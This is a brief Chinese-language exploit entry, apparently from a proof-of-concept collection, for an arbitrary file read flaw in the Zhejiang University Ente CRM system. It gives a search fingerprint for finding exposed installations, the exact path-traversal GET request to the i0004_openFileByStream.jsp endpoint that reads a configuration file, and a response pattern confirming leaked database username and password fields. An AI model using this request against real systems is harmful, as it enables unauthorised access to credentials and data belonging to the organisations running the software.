# 浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口任意文件读取漏洞

浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="浙大恩特客户资源管理系统"`
- **请求**：`GET /entsoft/module/i0004_openFileByStream.jsp?filepath=/../EnterCRM/bin/xy.properties&filename=conan HTTP/1.1`
- **响应特征**：200 ^(?=.*?enter.user)(?=.*?enter.password).*?$